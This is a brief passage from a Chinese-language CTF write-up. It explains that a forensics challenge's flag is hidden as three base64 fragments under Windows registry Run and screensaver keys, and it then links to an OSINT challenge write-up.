最终flag以base64编码的形式分成三段藏在以下三个值里。拼接后即可得到一段Python代码，运行后即可拿到flag。

```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Screensavers\ssText3d\Screen 3
```

![4-4-2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153144.png)

## 5 OSINT

https://medium.com/@drv1us/ascwg-2022-ctf-qualifications-osint-challenges-writeup-cb21f270eb66
